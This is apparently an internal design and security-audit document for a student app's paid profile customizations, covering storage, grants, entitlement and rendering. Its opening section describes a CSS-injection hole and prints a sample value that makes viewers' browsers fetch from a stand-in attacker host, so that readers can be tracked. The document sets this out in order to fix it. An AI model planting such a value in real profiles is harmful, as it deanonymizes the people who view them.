# The Customization Catalog

## 0. The one thing that must ship before anything is sold

`users.banner_gradient` is a `text` column holding a **raw CSS value**, written by the student, rendered verbatim.

Measured, not inferred:

- `has_column_privilege('authenticated','public.users','banner_gradient','UPDATE')` → **true**. Granted at `supabase/migrations/20260903100000_security_hardening.sql:55-60`.
- Policy `users_update_self`: `USING (auth.uid() = id) WITH CHECK (auth.uid() = id)`.
- The browser holds the anon key (`src/lib/supabase/env.ts:12`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`).

So `PATCH /rest/v1/users?id=eq.<me>` with `{"banner_gradient": "<anything>"}` succeeds. The validator at `src/app/api/me/profile/route.ts:146-157` never runs. There is no DB CHECK on the column (only `users_handle_format_check` and `orgs_backdrop_preset_check` exist), and no length cap outside the routes' `slice(0, 4000)`.

That value is then applied as a CSS `background` at:

| Site | Line | Who sees it |
|---|---|---|
| `src/components/network/UserCard.tsx` | :141 | every student browsing Network |
| `src/components/mobile/ProfileMobile.tsx` | :1046 | every phone profile visit |
| `public/html/profile.html` | :8782 | desktop profile |
| `public/html/_profilePreview.js` | :123 | profile cards **inside DMs** |
| `src/components/nav-identity-chip.tsx` | :232 | your own sidebar |

And `/api/me/suggested-connections/route.ts:277` selects `banner_gradient` for everyone in the suggestion list.

**What an attacker does with it.** `background` is a shorthand accepting layered images. `linear-gradient(#000,#000), url(https://attacker.example/b.png?s=1)` fetches the attacker's host from the browser of every student who sees that card. There is **no CSP** — `next.config.ts:36-40` states "No CSP yet: the static prototypes under /html rely on inline scripts". That is an IP + user-agent + timing beacon on anyone who opens Network, receives a shared profile card in a DM, or visits the profile. Principle 05 says identities are private; this hands them out through a cover-photo setting. Note the route validator would not stop it either — `g.startsWith("linear-gradient")` passes `linear-gradient(#000,#000),url(...)`.

**Second-order:** the column is unbounded through PostgREST. One student storing 2 MB of text there inflates the Network payload for every viewer, because `suggested-connections` selects it per person.

**The fix is the storage model below**, and it is not optional groundwork — it is the reason the catalog can be gated at all. An enum key cannot beacon.

The project already has this right once: `orgs.backdrop_preset` is CHECK-constrained in the DB to six values, allowlisted again at `src/app/api/orgs/route.ts:13-20` and `src/app/api/orgs/[slug]/route.ts:160-163`, and the CSS never leaves the server's own constant table. **Copy that, everywhere.**

---

## 1. What a student can already change (all free)

| # | Customization | Stored | Edited at | Rendered at | Validation today |
|---|---|---|---|---|---|
| 1 | Cover photo | `users.banner_url` | profile.html:3240; ProfileMobile.tsx:1053 | 5 sites above | 6 MB cap `src/lib/profile/storage-upload.ts:15`; MIME allowlist :7-13; `profiles` bucket public, 8 MB limit; 30 uploads/10 min `api/me/profile-upload/route.ts:86` — **good** |
| 2 | Cover gradient | `users.banner_gradient` | profile.html:3241 → `openGradientModal` :4163; 8 presets :4150-4159 | same 5 sites | **broken (§0)** |
| 3 | Avatar | `users.avatar_url` | profile.html:3252, :4022; ProfileMobile crop flow | ~71 refs across campus-home.tsx (39), CampusMobile.tsx (9), _postViewer.js (11), _miniMessenger.js (12) | same upload path — good |
| 4 | @handle | `users.handle` | SettingsClient.tsx:766; profile.html inline editor | everywhere | `handle-change.ts`, 14-day cooldown, reserved list, **no UPDATE grant** (verified false), DB CHECK `^[a-z0-9_]{3,20}$` — **the gold standard in this repo** |
| 5 | Name / tagline / headline / location / bio / website | `users.*` | both viewports | everywhere | length caps at api/me/profile/route.ts:122-144 |
| 6 | Vibe tag labels | `users.interests` | profile.html:4303 | profile, mobile | trimmed, capped |
| 7 | **Vibe tag colors** | **nowhere** | profile.html:7627 reads the color class | `build-vibe-user-v1.ts:58-61` reassigns by array index | the student's chosen color is silently discarded — profile.html:7769 sends labels only |
| 8 | "Working on" emoji / logo | `users.current_on` jsonb | profile.html | profile, mobile | `current-on.ts`: 10 items, icon ≤12 chars, http(s)-only logo — good |
| 9 | Work-experience order | `users.work_order_manual` | drag | both | boolean |
| 10 | Pinned post | `users.pinned_post_id` | profile.html:5506 | profile | uuid |
| 11 | Campus | `users.school` | SettingsClient.tsx:539 | badges, scoping | `normalizeCampusLabel` — enum, good |
| 12 | Org backdrop (6 presets) | `orgs.backdrop_preset` | campus-home.tsx:1037 (create), :1502 (settings) | orgs/[handle]/page.tsx:179; campus-home.tsx:578, :733; CampusMobile.tsx:592, :1915 | DB CHECK + route allowlist — **the model** |
| 13 | Chat backdrop | inherited from #12 | org settings only | `ConversationView backdropCss` | inherited |
| 14 | Otto chattiness + 5 toggles + summary time | `users.otto_settings` jsonb | OttoSettings.tsx:14-66 | Otto surfaces | per-key whitelist `api/me/otto/settings/route.ts:28-57` — good |
| 15 | Personal event color | `personal_events.color` | LeftNav.tsx:1621, presets :1704; profile.html:9125-9131 | calendar | **server validation not checked this pass — verify before tiering** |
| 16 | Otto's name | *removed* | — | — | was built, then deleted; `onboarding.html:550` pins `ottoName: 'otto'` |

Live usage (8 users): 1 has a gradient, 4 an avatar, 3 a banner, 1 non-default Otto settings, 7 have changed their handle, 0 have pinned a post.

**Two parity gaps worth knowing now:** the phone has **no gradient picker at all** (ProfileMobile.tsx:1046 renders the gradient but only offers "Change cover" photo upload at :1053), and `src/app/orgs/[handle]/page.tsx:18-35` defines only five backdrops — `cream` is missing, so an org that picks Cream renders Sand purple on its own page (:179 fallback).

---

## 2. The catalog

Snapchat+ sells identity and status, not utility. Weight everything toward **what other students see**. The rule for the tier line: *if only you can see it, it is free; if the campus can see it, it can be paid.* One exception in both directions — the cover photo stays free (it is the hook, and taking it back would be a regression), and profile layout is paid despite being mostly self-regarding, because it is what a recruiter sees.

### Free forever (the identity baseline)
Avatar, cover photo, 6 core cover themes, handle, name/tagline/bio, 6 tag colors (once they persist), working-on emoji, pinned post, campus, Otto chattiness. This is what makes the app feel normal.

### Vibe+ — the paid catalog

Ordered by *visibility per unit of build cost*.

| Item | What it changes | Desktop React | Phone React | Static pages | Cost |
|---|---|---|---|---|---|
| **Cover theme pack** (+6, reusing the org backdrop CSS verbatim) | profile hero, every user card | UserCard.tsx, nav-identity-chip.tsx | ProfileMobile.tsx | profile.html, _profilePreview.js | **near zero — the CSS already exists at campus-home.tsx:194-242** |
| **Avatar ring** | a ring on your avatar *everywhere* — feed, comments, DMs, search | ~48 avatar sites | 9 sites | _postViewer.js, _miniMessenger.js | M — one shared component, many call sites |
| **Name style** (accent color / gradient on your display name) | wherever your name renders | same | same | same | M |
| **Emblem** (a small glyph after your name) | same | same | same | same | S once the ring ships |
| **Chat theme** | DM bubble palette + wallpaper | campus-home ConversationView | MessagesMobile.tsx:3769-3790 | _miniMessenger.js, messages.html | M |
| **Otto rename + orb skin** | Otto's name and the orb color in the corner, panel, ask-bubble | _otto.js:67, :104, :271, :289 | OttoMobile | _otto.js | **S — the rename shipped once and was removed** |
| **Campus pride theme** | cover + accent keyed to one of the 9 campuses (campuses.ts:34-42) | all | all | all | S after the theme registry |
| **Profile layout** (section order, which sections show) | your profile only | — | ProfileMobile | profile.html | L |
| **Extra tag colors** (+6) | profile, cards | — | — | profile.html | S |

**The cheapest three paid wins, in order:** cover theme pack (the art exists), Otto rename (the code existed and was deleted), extra tag colors (needs the persistence fix anyway). None require new design work.

---

## 3. Storage and render model

### Storage — recommendation: typed enum columns on `public.users`, not jsonb, not a side table

```sql
alter table public.users
  add column cover_theme  text not null default '',
  add column accent_theme text not null default '',
  add column avatar_ring  text not null default '',
  add column name_style   text not null default '',
  add column emblem       text not null default '',
  add column chat_theme   text not null default '';

alter table public.users add constraint users_cover_theme_check
  check (cover_theme = '' or cover_theme = any (array['cream','sand-purple','ember',...]));
-- one CHECK per column, exactly like orgs_backdrop_preset_check
```

**Why not jsonb.** This project's security boundary is column grants, not routes ("grants not routes are the boundary"). A jsonb blob has one grant for all its keys, so the moment one key is paid and another is free, the grant can no longer express the rule — and `otto_settings` shows the consequence: it is self-updatable, so its careful whitelist at `api/me/otto/settings/route.ts:28-57` is advisory, exactly like the gradient validator. A CHECK constraint on a jsonb key is also unreadable next to `orgs_backdrop_preset_check`.

**Why not a separate table.** Ten call sites already select these fields' neighbours from `users` (feed/route.ts:151, suggested-connections:277, search/route.ts:73, users/[handle]/bootstrap:18, me/profile-bootstrap:16, connections/queries.ts:201...). A join at each is more code and more latency than six short columns. Measured: the average users row is 1216 bytes; six enum keys add roughly 60. Revisit only past ~10 knobs.

**The grants are the design.** 

```sql
-- do NOT grant UPDATE on any of the new columns
grant select (cover_theme, accent_theme, avatar_ring, name_style, emblem, chat_theme)
  on public.users to authenticated;
revoke update (banner_gradient) on public.users from authenticated;
```

Writes go through **one** route, service-role, which is then the only thing that has to be correct. This is the same move already made for `handle` (verified: `has_column_privilege(...,'handle','UPDATE')` = false).

`banner_gradient` gets migrated: the one live value maps to its matching preset key, then the column is read-only and eventually dropped.

### Entitlement — its own table, zero client grants

```sql
create table public.user_premium (
  user_id uuid primary key references public.users(id) on delete cascade,
  status text not null check (status in ('active','grace','lapsed')),
  current_period_end timestamptz,
  source text not null
);
-- no grants to authenticated at all; service role only
```

One helper, `src/lib/premium/entitlement.ts`, exports `isPremium(userId)`. `api/me/profile-views/route.ts:103` already hardcodes `premium: false` with a comment saying it becomes a billing read — that is its first caller.

### Render — one registry, two emissions

Source of truth: `src/lib/customization/catalog.ts` — `{ key → { label, tier, css } }`. The static pages are vanilla JS and cannot import TS, so a script in `scripts/` generates `public/html/_themes.js` from it, both committed, with a check that they agree. **The CSS never travels in a payload; only the key does.**

One resolver used by every surface:

```ts
resolveTheme(slot, key, isPremium) // → css string
// paid key + !isPremium → the free default. Never the paid CSS.
```

Lapse becomes one boolean at read time — no backfill job, no migration when someone stops paying.

### No flash of the wrong theme

- **Static pages:** the guard already exists — `profile.html:31-45` sets `html.vibe-pre-paint` synchronously from `localStorage` and hides `.profile-wrap` / `.profile-cover` until hydration. The theme key rides in `vibe_user_v1` (`build-vibe-user-v1.ts`) and in the visitor payload (`users/[handle]/bootstrap/route.ts:18`), so it is present at the same moment the avatar is. No new mechanism.
- **React, your own theme:** `nav-identity-chip.tsx:90-110` fetches after mount — that is a guaranteed flash if the sidebar is themed. Seed the key server-side into the document (a `data-` attribute on `<html>` or a small inline `<script>` at layout level) so first paint is already correct.
- **React, other people's themes:** add the keys to the selects that already fetch those users (feed:151, suggested-connections:277, search:73). No extra request, so no second paint.
- **Locked items never apply-then-revert.** `OttoSettings.tsx:98-120` is the right pattern for *free* toggles — optimistic, with rollback to the last server-confirmed state. For a **locked** item, do not be optimistic at all: the swatch shows a lock, tapping opens the upgrade sheet, and nothing paints until the server confirms entitlement. A student must never see their profile turn gold and then turn back.

---

## 4. Safety, item by item

Every customization is one of exactly three shapes. Nothing else is accepted.

| Shape | Items | Validation | If it were not validated |
|---|---|---|---|
| **Enum key** | cover theme, accent, ring, name style, emblem, chat theme, campus pride | DB CHECK + route allowlist + `resolveTheme` falls back to default on an unknown key | the §0 beacon: arbitrary CSS → `url()` fetches to an attacker host from every viewer's browser, deanonymizing readers with no CSP to stop it |
| **Bounded scalar** | Otto name (≤24 chars, `[\p{L}\p{N} ]`, no zero-width, no RTL override), tag color index, layout order (permutation of a known list) | server regex + length + set membership | an Otto name of 4000 invisible chars or an RTL override breaks every layout that renders it; a layout array with duplicates crashes the renderer |
| **Uploaded image** | avatar, cover photo | existing path: MIME allowlist + 6 MB + server-side upload + per-user key prefix (`storage-upload.ts:25-55`), 30/10 min | already correct — do not add a second upload path for themes |

Hard rules for the implementing agent:

1. **Never store CSS, HTML, a URL, or a color literal from a student.** Store a key. The CSS lives in `catalog.ts` on the server.
2. **Never `dangerouslySetInnerHTML`, never `el.style.background = <value from the DB>`.** Today `profile.html:8782` and `_profilePreview.js:123` do exactly that — both must change to a key lookup.
3. **Delete the DOM-scrape write path.** `profile.html:7617-7622` reads `coverEl.style.background` back out of the DOM and syncs whatever is there. Anything that gets into that element — devtools, a future XSS, a browser extension — becomes persisted, cross-device CSS. Replace with "the selected key", full stop.
4. **The grant is the boundary; the route is convenience.** No new customization column is ever granted UPDATE to `authenticated`.
5. **The emblem must never be confusable with school verification.** `VerifiedBadge` renders at ProfileMobile.tsx:1371 (also campus-home.tsx:13034, orgs/[handle]/page.tsx:508) and means *IU checked this person's email*. A paid emblem that looks like it sells a lie about identity. Different shape, different color, and it always renders **after** the verified badge, never in its slot.
6. **Rate-limit the write.** `PATCH /api/me/profile` has no rate limit today (only profile-sync at 20/10 min and profile-upload at 30/10 min). The customization route gets its own, ~30/10 min.

---

## 5. Honesty and what happens when payment lapses

**Recommendation: keep the choice, stop rendering it, say so.** On lapse, `resolveTheme` returns the free default because `isPremium` is false. The stored key is untouched. The owner's Appearance screen shows the paid items greyed with "paused — resubscribe to turn these back on", naming each one. Resubscribing is instant and restores exactly what they had.

Why this over the alternatives: wiping the keys is destructive and unrecoverable; rendering paid themes forever after lapse removes the reason to renew; and *silently* reverting with no message is the failure mode this codebase has spent multiple sessions removing. A 3-day `grace` status covers a failed card without a visible downgrade.

Every failed or refused save uses the existing helpers — `vibeRequest` (`src/lib/feedback/request.ts`) in React, `window.vibeRequest` in `public/html/_persistence.js`. A theme that does not save must say it did not save.

---

## 6. Performance

These render on every card on a phone.

- **Ship keys, not CSS.** Current gradient strings run to 87 chars and are capped at 4000 (unbounded through PostgREST). Thirty feed authors could carry >100 KB of CSS text; keys make it ~150 bytes.
- **No `backdrop-filter` in per-card themes.** `campus-home.tsx` already carries 20+ `backdropFilter: blur(28px) saturate(180%)` declarations. Stacking one per card is the single most likely way to drop frames on a mid-range Android. Avatar rings are a `border` or `box-shadow`, never a filter.
- **No animated gradients on cards.** Animating `background-position` repaints every frame for every visible card. If an animated theme ships, restrict it to the profile hero — one instance per screen — and honor `prefers-reduced-motion`.
- **The key→CSS map is a module constant**, resolved once. `UserCard.tsx:170` already memoizes its banner style; keep that shape.
- **No new round trip.** Keys go into selects that already run. A separate `/api/me/customization` GET on every screen would undo the whole benefit.
- **`profiles` bucket is public** (verified) so avatars and covers are CDN-cacheable; theme keys are equally cacheable because the CSS is static per key.

---

## 7. Build order

1. **B1-db-safety** — lock the gradient, add the enum columns, add `user_premium`. Nothing else can ship honestly first.
2. **B2-server-catalog** — catalog, resolver, entitlement, the write route, the selects.
3. **B3-desktop-static** and **B4-react-desktop** — the two surfaces a student customizes from.
4. **B5-react-mobile** — including the gradient picker the phone has never had.
5. **B6-org-parity** — the Cream bug and the tag-color loss.

Gate the paid half behind a flag until billing exists. `src/lib/feature-flags.ts` has exactly one flag and the same shape works here; `src/proxy.ts` is where any route gate goes (dev and prod agree there, the repo root does not).